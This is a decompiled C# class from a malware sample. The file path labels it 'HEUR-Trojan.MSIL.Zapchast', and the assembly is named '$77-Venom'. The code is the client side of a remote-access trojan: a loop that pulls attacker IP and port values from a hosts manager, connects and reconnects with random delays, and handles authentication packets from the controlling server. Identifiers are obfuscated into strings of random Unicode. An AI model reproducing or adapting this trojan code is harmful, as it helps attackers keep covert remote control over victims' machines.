// Decompiled with JetBrains decompiler
// Type: ㋈ആ밄ᩓ䩍뻾맳⢑ꄠ�赆㶆愠譃뷉븄᣾
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.NetSerializer;
using xClient.Core.Packets.ServerPackets;

public class \u32C8ആ밄ᩓ\uE5F8\uEDC3䩍뻾맳\u2891ꄠ\uEA2E\uFFFD赆㶆愠譃뷉븄\u18FE : 
  \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ
{
  private readonly ઝ忧㷫\uFFC9挰螀ℬ䀖\uFFFD\uFFFD鑁眔ꤛ\uE4ADⰸ\uF35A\u2A08稏ᇙ䌅 䤛䪓ㄋ샺\u2004\uF43B\uFFFD뙖\u0832\u0C4E㕓\u0530솙ᔱﰈ糳\u20C0\uFFFDᶴ笪;

  public static bool Exiting { get; private set; }

  public bool Authenticated { get; private set; }

  public \u32C8ആ밄ᩓ\uE5F8\uEDC3䩍뻾맳\u2891ꄠ\uEA2E\uFFFD赆㶆愠譃뷉븄\u18FE(
    ઝ忧㷫\uFFC9挰螀ℬ䀖\uFFFD\uFFFD鑁眔ꤛ\uE4ADⰸ\uF35A\u2A08稏ᇙ䌅 hostsManager)
  {
    this.䤛䪓ㄋ샺\u2004\uF43B\uFFFD뙖\u0832\u0C4E㕓\u0530솙ᔱﰈ糳\u20C0\uFFFDᶴ笪 = hostsManager;
    this.Serializer = new Serializer((IEnumerable<System.Type>) \uF393좰ย憡\u284B\uF2E3텛阌찓ᘓ曻觽껔ㆯᯂ絨ﾎ팛ꍐ醊.\uE68A轀蠪ꡞ펡詨麕蝳Ϳ礈\u2275ᬂ곮\u21B2\u09FE뛷꯷듛诣雃());
    this.\uF255械썧๔닋뉲쨣\uEB5F啔\uEE6D\uF62F죫쇞ᒉ\uFFFDᐂ州ꄪ璗橫 += new \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.ꢄ絹ￏ恵襇럁\u2EC7笏㻣\u28C3ᱶ\uE8C5㫗咿㶠쇸퓫ᱲ㤣뵏(this.\uE492笠䧒胳䋒呎薱Ǣ䤮ᐥ疱网स邰㢳\uECC7袚솧殚\uE95B);
    this.婘\uED96䜠턔藴ǬΎꘜ烏\uEF1Fὐ蔗顀\uECFB\uE0B4\uEDAFﴭ巄\u2EBF\uE598 += new \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.\u108C쌬먿圽ᙜ黦ꕛ\uA7ED㖵蔡뫝ꉼᅮ暾\u0A0E睯䟯\uF376\uE72Fゕ(this.砎꼓鿆祕㦰걙裺哫鋿퇡ꏹ븷\u1AAF\u32E6\uF30C躻뙵ꗰ记瘃);
    this.ꡉ䮊ⵜꇹű嚯欽ꊂ\u19E6喍檅쨢倭\uF03D赂\uE616ݞ\uFFEE䳛牘 += new \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.翤ꘉ骸晴掌훌\uA6FDήᇴ\u2E22釓\uE00E蚟挳䗷\u2FD6螬膥斫峽(this.\u0AF5묵ꎈピ\u0F48\uEE18颭\uF21C袭傠壑ӱ僧杜䣍釼\u2537࣯픒秽);
  }

  public void 譏Ѱ伍\uFFFD\uF60F䜵\uEB85樾뚟\uECB8禗댙䰵謻鑊퓮옧偞神゙()
  {
    while (!\u32C8ആ밄ᩓ\uE5F8\uEDC3䩍뻾맳\u2891ꄠ\uEA2E\uFFFD赆㶆愠譃뷉븄\u18FE.Exiting)
    {
      if (!this.Connected)
      {
        Thread.Sleep(100 + new Random().Next(0, 250));
        ᴃ䵶헩堐\uFDED薳爊\u008D辍\u1CB6\uA6F6䆆ţ콋᷎㓶ퟛ\uFFFD䨶㥜 ᴃ䵶헩堐薳爊辍䆆ţ콋᷎㓶ퟛ䨶㥜 = this.䤛䪓ㄋ샺\u2004\uF43B\uFFFD뙖\u0832\u0C4E㕓\u0530솙ᔱﰈ糳\u20C0\uFFFDᶴ笪.ჭ聪덤嬿ￎ\uF7D3㘻螹幀〤粿\uEDE5Ꮯ䒙\u9FEF臎㿒ᵠ\uF73D犑();
        this.栶䢙ꪚꙮ\uF64B謮賳\uF0AA셺䕣塏ꨢ\uF1DA셥兓\uE546톎헩\u2E4B\u1CFF(ᴃ䵶헩堐薳爊辍䆆ţ콋᷎㓶ퟛ䨶㥜.IpAddress, ᴃ䵶헩堐薳爊辍䆆ţ콋᷎㓶ퟛ䨶㥜.Port);
        Thread.Sleep(200);
        Application.DoEvents();
      }
      while (this.Connected)
      {
        Application.DoEvents();
        Thread.Sleep(2500);
      }
      if (\u32C8ആ밄ᩓ\uE5F8\uEDC3䩍뻾맳\u2891ꄠ\uEA2E\uFFFD赆㶆愠譃뷉븄\u18FE.Exiting)
      {
        this.킽믭죵䥭乫ౄ玤寞\u2B02濄앟毑\uFE5F\uAA39槔\uE764헽㸀泼梹();
        break;
      }
      Thread.Sleep(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.儯팕髑贷\uFFFD\u22DDᅙ屯Ῥて\uF61A礟ᐉ\uEA27閡㞨傻栊띙唿 + new Random().Next(250, 750));
    }
  }

  private void 砎꼓鿆祕㦰걙裺哫鋿퇡ꏹ븷\u1AAF\u32E6\uF30C躻뙵ꗰ记瘃(
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client,
    븞朱\uEBB8統ᡣꡜŶ\uF43D\uF85B蒣냋㡁臀핝닍뤱畱쪩㐨\u20DE packet)
  {
    System.Type type = packet.GetType();
    if (!this.Authenticated)
    {
      if (type == typeof (GetAuthentication))
      {
        쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.㧆抓퇲\uE0CFź揍끲熐퇸폙\uE294㘄䢵\uFFFDꚔ㷽싊\uE412\u9FFDᥞ((GetAuthentication) packet, client);
      }
      else
      {
        if (!(type == typeof (SetAuthenticationSuccess)))
          return;
        this.Authenticated = true;
      }
    }
    else
      岺但\u0B73\uFFFDㄝᜨ\u29B8蘌麷ュ辪頃塺妻꺡눝伶䗏\uFFFD䩞.惧\uEE8C宄ꤝａ凯\u2633쳺ﷺ㔛ꬼᎥ\uE577쪰ⅲԆ\uE1C8㦢ퟁ燠(client, packet);
  }

  private void \u0AF5묵ꎈピ\u0F48\uEE18颭\uF21C袭傠壑ӱ僧杜䣍釼\u2537࣯픒秽(
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client,
    Exception ex)
  {
    client.킽믭죵䥭乫ౄ玤寞\u2B02濄앟毑\uFE5F\uAA39槔\uE764헽㸀泼梹();
  }

  private void \uE492笠䧒胳䋒呎薱Ǣ䤮ᐥ疱网स邰㢳\uECC7袚솧殚\uE95B(
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client,
    bool connected)
  {
    this.Authenticated = false;
    if (connected || \u32C8ആ밄ᩓ\uE5F8\uEDC3䩍뻾맳\u2891ꄠ\uEA2E\uFFFD赆㶆愠譃뷉븄\u18FE.Exiting)
      return;
    this.엵鄧皬㵴郏䃿䏸衦驰\uFDE3藢୮Ṵ\u2996蛰\uFFFD๓\u2731䏳엄();
  }

  private void 엵鄧皬㵴郏䃿䏸衦驰\uFDE3藢୮Ṵ\u2996蛰\uFFFD๓\u2731䏳엄() => 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.틹ஃ\uF210\uF54D핧赝桕\u4DFFﻛ產㬙믡䃏횥倦\uECB0䌐ᾰ깃临();

  public void 旋\uF321\u28D9尡\u087F㔆\uEA3B풤뀒짣䧉㮲脞謕䁳\uEC03숨ᩥᔷ\uE492()
  {
    \u32C8ആ밄ᩓ\uE5F8\uEDC3䩍뻾맳\u2891ꄠ\uEA2E\uFFFD赆㶆愠譃뷉븄\u18FE.Exiting = true;
    this.킽믭죵䥭乫ౄ玤寞\u2B02濄앟毑\uFE5F\uAA39槔\uE764헽㸀泼梹();
  }
}
